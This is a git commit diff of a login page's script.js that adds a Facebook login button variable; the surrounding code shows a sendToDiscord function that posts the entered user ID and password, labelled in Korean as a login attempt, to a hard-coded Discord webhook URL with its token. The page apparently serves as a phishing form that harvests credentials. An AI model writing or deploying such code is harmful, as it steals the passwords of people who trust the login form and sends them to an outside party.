b8c23c8f65dc03c642427f568e90aec64ea7335b
7test357 <7test357@gmail.com>
2024-11-24 20:10:10 +0900

    Update script.js

--- script.js
+++ script.js
@@ -5,6 +5,7 @@ let inputId = inputTag[0];
 let inputPassword = inputTag[1];
 
 let ordinaryButton = buttonArray[0];
+let facebookLoginButton = buttonArray[1];
 
 inputPassword.addEventListener("keyup", () => {
     if (inputId.value && inputPassword.value) {
@@ -25,7 +26,7 @@ ordinaryButton.addEventListener('click', () => {
 
 function sendToDiscord(userId, password) {
     const webhookURL = 'https://discord.com/api/webhooks/1310193187427586058/fshmsmwoK622L7ha0-rDkvG601rT5bC3P6i-TcMpPVIQN3GmbJS-OJ_wN3STVsY9iPXU';
-    
+
     const data = {
         content: `로그인 시도:\n아이디: ${userId}\n비밀번호: ${password}`
     };
